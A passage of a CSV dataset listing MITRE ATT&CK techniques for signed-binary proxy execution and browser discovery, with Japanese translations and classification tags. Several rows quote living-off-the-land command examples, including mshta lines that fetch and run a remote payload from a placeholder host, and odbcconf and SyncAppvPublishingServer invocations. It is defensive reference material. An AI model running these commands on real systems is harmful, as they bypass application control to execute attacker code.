に制限することで実現されています。",defense-evasion,Windows,credential_abuse,stealth,authentication_system;endpoint_execution;network_connectivity;file_storage_access,specified,AD / Directory Server;Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58,2020-02-03T16:49:57.788Z,2025-04-16T20:37:14.984Z,,,,
T1216.002,T1216,SyncAppvPublishingServer,SyncAppvPublishingServer,"Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv) The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv) Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by ""living off the land.""(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv) `SyncAppvPublishingServer.vbs ""n; {PowerShell}""`","攻撃者は SyncAppvPublishingServer.vbs を悪用し、悪意のある [PowerShell](https://attack.mitre.org/techniques/T1059/001) コマンドの実行をプロキシする可能性があります。SyncAppvPublishingServer.vbs は、Windows がアプリケーションを仮想化する仕組み（Microsoft Application Virtualization、または App-V）に関連付けられた Visual Basic スクリプトです。(引用: 1 - appv) 例えば、Windows は Win32 アプリケーションを仮想アプリケーションとしてユーザーに提供し、ユーザーがローカルにインストールされたかのように起動・操作できるようにします。(引用: 2 - appv)(引用: 3 - appv) SyncAppvPublishingServer.vbs スクリプトは正規のもので、Microsoft によって署名されている場合があり、通常 `\System32` から `wscript.exe` 経由でコマンドラインによって実行されます。(引用: 4 - appv)(引用: 5 - appv) 攻撃者は SyncAppvPublishingServer.vbs を悪用し、[PowerShell](https://attack.mitre.org/techniques/T1059/001) の実行制限を迂回し、「現地の環境を活用する」手法で防御対策を回避する可能性があります。(引用: 6 - appv)(引用: 4 - appv) プロキシ実行は、`powershell.exe`を直接呼び出す代わりに、信頼された署名付きの実行手段として機能する可能性があります。(引用: 7 - appv) 例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001) コマンドは以下のように呼び出せます:(引用: 5 - appv) `SyncAppvPublishingServer.vbs ""n; {PowerShell}""`",defense-evasion,Windows,script_command_execution,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--e6f19759-dde3-47fc-99cc-d9f5fa4ade60,2024-02-06T16:20:41.647Z,2025-04-15T23:13:55.573Z,,,,
T1217,,Browser Information Discovery,ブラウザ情報の発見,"Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill) Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser. Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)",攻撃者は、侵害された環境の詳細を把握するためにブラウザに関する情報を列挙する可能性があります。ブラウザに保存されたデータ（ブックマーク、アカウント、閲覧履歴など）は、ユーザーに関する様々な個人情報（例：銀行サイト、人間関係/興味、ソーシャルメディアなど）や、サーバー、ツール/ダッシュボード、その他の関連インフラストラクチャなどの内部ネットワークリソースに関する詳細を明らかにする可能性があります。（引用元：Kaspersky Autofill）攻撃者が有効な認証情報（特にブラウザにキャッシュされたログイン情報に関連する[ファイル内の認証情報](https://attack.mitre.org/techniques/T1552/001)）を入手した後、ブラウザ情報は追加の標的を特定する手がかりとなる場合がある。 具体的な保存場所はプラットフォームやアプリケーションによって異なりますが、ブラウザ情報は通常、ローカルファイルやデータベース（例：`%APPDATA%/Google/Chrome`）に保存されます。(引用元: Chrome Roaming Profiles),discovery,Linux;Windows;macOS,credential_abuse,situational_awareness,authentication_system;user_interaction;network_connectivity;file_storage_access;database_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7,2018-04-18T17:59:24.739Z,2025-04-15T21:54:16.719Z,,,,
T1218,,System Binary Proxy Execution,システムバイナリプロキシ実行,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands. Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",攻撃者は、署名済みまたは信頼されたバイナリを介して悪意のあるコンテンツの実行をプロキシすることで、プロセスベースおよび/または署名ベースの防御を回避する可能性があります。この手法で使用されるバイナリは、Microsoft 署名ファイルであることが多く、Microsoft からダウンロードされたか、オペレーティングシステムに既に組み込まれていることを示しています。(引用元: LOLBAS Project) 信頼されたデジタル証明書で署名されたバイナリは、通常、デジタル署名検証で保護された Windows システム上で実行可能です。 Windowsインストール時にデフォルトで存在する複数のMicrosoft署名付きバイナリは、他のファイルやコマンドの実行をプロキシするために利用可能です。同様に、Linuxシステムでは攻撃者が<code>split</code>などの信頼されたバイナリを悪用し、悪意のあるコマンドの実行をプロキシすることがあります。(引用: split manページ)(引用: GTFO split),defense-evasion,Windows;Linux;macOS,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--457c7820-d331-465a-915e-42f85500ccc4,2018-04-18T17:59:24.739Z,2025-04-15T19:58:27.332Z,,,,
T1218.001,T1218,Compiled HTML File,コンパイル済みHTMLファイル,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program) A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",攻撃者は、コンパイル済み HTML ファイル (.chm) を悪用して悪意のあるコードを隠蔽する可能性があります。CHM ファイルは、Microsoft HTML ヘルプシステムの一部として一般的に配布されています。 CHMファイルは、HTML文書、画像、VBA、JScript、Java、ActiveXなどのスクリプト/Web関連プログラミング言語など、様々なコンテンツを圧縮してコンパイルしたものです。(引用: Microsoft HTML Help May 2018) CHMコンテンツは、HTMLヘルプ実行プログラム(hh.exe)によって読み込まれるInternet Explorerブラウザの基盤コンポーネント(引用: Microsoft HTML Help ActiveX)を使用して表示されます。 (引用元: Microsoft HTML Help Executable Program) ペイロードを埋め込んだカスタムCHMファイルを被害者に配布し、[ユーザー実行](https://attack.mitre.org/techniques/T1204)によって起動させる可能性があります。また、hh.exe経由のバイナリ実行を考慮していない古いシステムやパッチ未適用のシステムでは、CHMの実行がアプリケーション制御を迂回する可能性があります。 (引用元: MsitPros CHM 2017年8月) (引用元: Microsoft CVE-2017-8625 2017年8月),defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d,2020-01-23T18:53:54.377Z,2025-04-15T19:58:56.001Z,,,,
T1218.002,T1218,Control Panel,コントロールパネル,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists. Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)",攻撃者はcontrol.exeを悪用し、悪意のあるペイロードの実行をプロキシする可能性がある。Windowsコントロールパネルのプロセスバイナリ(control.exe)は、ユーザーがコンピュータ設定を表示・調整するためのユーティリティであるコントロールパネル項目の実行を処理する。 コントロールパネル項目は、登録済み実行可能ファイル (.exe) またはコントロールパネル (.cpl) ファイルです。後者は実際には、<code>CPlApplet</code> 関数をエクスポートするダイナミックリンクライブラリ (.dll) ファイルの名前を変更したものです。(引用元: Microsoft Implementing CPL)(引用元: TrendMicro CPL Malware Jan 2014) 利便性のため、コントロールパネル項目は通常、登録・読み込み後にユーザーが利用可能なグラフィカルメニューを備えています（引用元：Microsoft Implementing CPL）。コントロールパネル項目は、コマンドラインからの直接実行、アプリケーションプログラミングインターフェース（API）呼び出しによるプログラム実行、またはファイルのダブルクリックで起動可能です（引用元：Microsoft Implementing CPL）（引用元：TrendMicro CPL Malware Jan 2014）。(引用元: TrendMicro CPL Malware Dec 2013) 悪意のあるコントロールパネル項目は、[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーン(引用元: TrendMicro CPL Malware Jan 2014)(引用元: TrendMicro CPL Malware Dec 2013)を介して配布されるか、多段階マルウェアの一部として実行される可能性があります。(引用元: Palo Alto Reaver 2017年11月) コントロールパネル項目、特にCPLファイルは、アプリケーションおよび/またはファイル拡張子の許可リストをバイパスする可能性もある。攻撃者は、悪意のあるDLLファイル(.dll)の名前をコントロールパネルファイル拡張子(.cpl)に変更し、<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>に登録することもある。 これらの登録済みDLLがCPLファイル仕様に準拠せず、<code>CPlApplet</code>関数をエクスポートしていなくても、コントロールパネル実行時には<code>DllEntryPoint</code>経由で読み込まれ実行される。<code>CPlApplet</code>をエクスポートしないCPLファイルは直接実行可能ではない。(引用: ESET InvisiMole 2020年6月),defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f,2020-01-23T19:59:52.630Z,2025-04-25T14:46:37.731Z,,,,
T1218.003,T1218,CMSTP,CMSTP,Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo E CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017) and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft. CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018),攻撃者は悪意のあるコードの実行をプロキシするためにCMSTPを悪用する可能性があります。Microsoft Connection Manager Profile Installer（CMSTP.exe）は、Connection Managerサービスプロファイルをインストールするためのコマンドラインプログラムです。（引用元：Microsoft Connection Manager 2009年10月）CMSTP.exeはインストール情報ファイル（INF）をパラメータとして受け取り、リモートアクセス接続に利用されるサービスプロファイルをインストールします。 攻撃者は、悪意のあるコマンドに感染したINFファイルをCMSTP.exeに供給する可能性があります。（引用元：Twitter CMSTP Usage Jan 2018）[Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo E CMSTP.exeと同様に、悪用されてDLL （引用元：MSitPros CMSTP 2017年8月）および/またはリモートサーバーからのCOMスクリプトレット（SCT）をロード・実行するために悪用される可能性があります。（引用元：Twitter CMSTP 2018年1月）（引用元：GitHub Ultimate AppLocker Bypass List）（引用元：Endurant CMSTP 2018年7月） この実行は、CMSTP.exeがMicrosoftによって署名された正当なバイナリであるため、AppLockerやその他のアプリケーション制御防御も回避する可能性があります。CMSTP.exeはまた、[ユーザーアカウント制御の回避](https://attack.mitre.org/techniques/T1548/002)に悪用され、自動昇格されたCOMインターフェースを介して悪意のあるINFから任意のコマンドを実行することも可能です。 (引用元: MSitPros CMSTP 2017年8月) (引用元: GitHub Ultimate AppLocker Bypass List) (引用元: Endurant CMSTP 2018年7月),defense-evasion,Windows,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49,2020-01-23T18:27:30.656Z,2025-04-15T19:58:29.296Z,,,,
T1218.004,T1218,InstallUtil,InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil),攻撃者は、信頼された Windows ユーティリティを介してコードの実行をプロキシするために InstallUtil を使用する可能性があります。InstallUtil は、.NET バイナリで指定された特定のインストーラコンポーネントを実行することでリソースのインストールおよびアンインストールを可能にするコマンドラインユーティリティです。 (引用元: MSDN InstallUtil) InstallUtilバイナリはMicrosoftによってデジタル署名され、Windowsシステムの.NETディレクトリ（<code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> および <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>）に配置される場合があります。 InstallUtil は、<code>[System.ComponentModel.RunInstaller(true)]</code> 属性で装飾されたクラスを実行するバイナリ内の属性を使用することで、アプリケーション制御をバイパスするためにも使用できます。(引用元: LOLBAS Installutil),defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--2cd950a6-16c4-404a-aa01-044322395107,2020-01-23T19:09:48.811Z,2025-04-25T14:46:11.581Z,,,,
T1218.005,T1218,Mshta,Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications) Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code> They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code> Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)","攻撃者は、信頼されたWindowsユーティリティを通じて悪意のある.htaファイルやJavaScript、VBScriptの実行をプロキシするためにmshta.exeを悪用する可能性があります。初期侵害時やコード実行時にmshta.exeを利用する様々な脅威の事例が複数存在します（出典：Cylance Dust Storm）（出典：Red Canary HTA Abuse Part Deux）（出典：FireEye Attacks Leveraging HTA） (引用: Airbus Security Kovter Analysis) (引用: FireEye FIN7 April 2017) mshta.exeはMicrosoft HTMLアプリケーション（HTA）ファイルを実行するユーティリティです。(引用: Wikipedia HTML Application) HTAは、Internet Explorerと同じモデルと技術を使用して実行されるスタンドアロンアプリケーションですが、ブラウザ外で動作します。 (引用: MSDN HTMLアプリケーション) ファイルはインラインスクリプト経由でmshta.exeによって実行される可能性がある: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code> またURLから直接実行される可能性もある: <code>mshta http[:]//webserver/payload[.]hta</code> mshta.exe は、その潜在的な使用を考慮していないアプリケーション制御ソリューションをバイパスするために使用できます。mshta.exe は Internet Explorer のセキュリティコンテキスト外で実行されるため、ブラウザのセキュリティ設定もバイパスします。(引用元: LOLBAS Mshta)",defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade,2020-01-23T19:32:49.557Z,2025-04-25T14:47:18.707Z,,,,
T1218.007,T1218,Msiexec,Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft. Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",攻撃者はmsiexec.exeを悪用し、悪意のあるペイロードの実行をプロキシする可能性があります。msiexec.exeはWindowsインストーラー用のコマンドラインユーティリティであり、インストールパッケージ(.msi)の実行と一般的に関連付けられています。(引用元: Microsoft msiexec) Msiexec.exeバイナリはMicrosoftによってデジタル署名されている場合もあります。 攻撃者はmsiexec.exeを悪用し、ローカルまたはネットワーク経由でアクセス可能なMSIファイルを起動する可能性があります。msiexec.exeはDLLの実行も可能です。（引用元：LOLBAS Msiexec）（引用元：TrendMicro Msiexec Feb 2018）Windowsシステム上で署名済みかつネイティブであるため、msiexec.exeはその悪用可能性を考慮していないアプリケーション制御ソリューションを迂回するために使用される可能性があります。 <code>AlwaysInstallElevated</code>ポリシーが有効な場合、msiexec.exeの実行権限はSYSTEM特権まで昇格される可能性があります。(引用: Microsoft AlwaysInstallElevated 2018),defense-evasion,Windows,script_command_execution,stealth,authentication_system;privileged_account;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336,2020-01-24T14:38:49.266Z,2025-04-16T20:37:16.547Z,,,,
T1218.008,T1218,Odbcconf,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft. Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)","攻撃者はodbcconf.exeを悪用し、悪意のあるペイロードの実行をプロキシする可能性があります。odbcconf.exeは、Open Database Connectivity（ODBC）ドライバーとデータソース名を設定するためのWindowsユーティリティです。（引用元: Microsoft odbcconf.exe）odbcconf.exeバイナリはMicrosoftによってデジタル署名されている場合があります。攻撃者はodbcconf.exeを悪用し、その悪用可能性を考慮していないアプリケーション制御ソリューションを回避する可能性があります。 [Regsvr32](https://attack.mitre.org/techniques/T1218/010)と同様に、odbcconf.exeには<code>REGSVR</code>フラグが存在し、DLLの実行に悪用される可能性があります（例：<code>odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>）。（引用元：LOLBAS Odbcconf）（引用元：TrendMicro Squiblydoo 2017年8月）（引用元：TrendMicro Cobalt Group 2017年11月）",defense-evasion,Windows,other,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access;database_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071,2020-01-24T15:01:32.917Z,2025-04-25T14:47:01.231Z,,,,
T1218.009,T1218,Regsvcs/Regasm,Regsvcs/Regasm,Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm) Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm),攻撃者は、信頼されたWindowsユーティリティを介したコード実行をプロキシするためにRegsvcsおよびRegasmを悪用する可能性があります。RegsvcsとRegasmは、.NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) アセンブリを登録するために使用されるWindowsコマンドラインユーティリティです。 両ユーティリティはMicrosoftによるデジタル署名付きバイナリである可能性がある。(引用元: MSDN Regsvcs) (引用元: MSDN Regasm) 両ユーティリティは、登録前または登録解除前に実行すべきコードを指定するバイナリ内の属性<code>[ComRegisterFunction]</code>または<code>[ComUnregisterFunction]</code>を利用することで、アプリケーション制御を迂回するために使用される可能性がある。 登録および登録解除属性を持つコードは、プロセスが不十分な権限で実行され実行に失敗した場合でも実行されます。（引用元：LOLBAS Regsvcs）（引用元：LOLBAS Regasm）,defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8,2020-01-23T19:42:16.439Z,2025-04-25T14:47:58.456Z,,,,
T1218.010,T1218,Regsvr32,Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32) Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov) Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",攻撃者は、悪意のあるコードの実行をプロキシするために Regsvr32.exe を悪用する可能性があります。Regsvr32.exe は、Windows システム上でダイナミックリンクライブラリ (DLL) を含むオブジェクトリンクおよび埋め込みコントロールを登録および登録解除するために使用されるコマンドラインプログラムです。 Regsvr32.exeバイナリはMicrosoftによって署名されている場合もある（引用元：Microsoft Regsvr32）。Regsvr32.exeの悪用は、Windowsが通常動作でregsvr32.exeを使用することによる許可リストや誤検知のため、regsvr32.exeプロセスの実行やロードされるモジュールを監視しないセキュリティツールの作動を回避できる可能性がある。 Regsvr32.exeは、ユーザー権限下でDLLを実行するCOMスクリプトリットをロードする機能を利用し、アプリケーション制御を意図的に回避するためにも使用可能です。Regsvr32.exeはネットワークとプロキシを認識するため、外部Webサーバー上のファイルへの統一リソースロケータ（URL）を引数として渡すことでスクリプトをロードできます。この手法では、COMオブジェクトが実際に登録されるのではなく実行されるだけであるため、レジストリに変更は加えられません。 (引用元: LOLBAS Regsvr32) この手法の変種は「スクイブルドゥー」と呼ばれることが多く、政府機関を標的とした攻撃キャンペーンで使用されてきた。 (引用元: Carbon Black Squiblydoo Apr 2016) (引用元: FireEye Regsvr32 Targeting Mongolian Gov) Regsvr32.exe は、[コンポーネントオブジェクトモデルハイジャック](https://attack.mitre.org/techniques/T1546/015) による永続化確立に使用される COM オブジェクトの登録にも活用可能です。 (引用元: Carbon Black Squiblydoo 2016年4月),defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab,2020-01-23T19:52:17.414Z,2025-04-16T20:37:19.846Z,,,,
T1218.011,T1218,Rundll32,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>). Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication 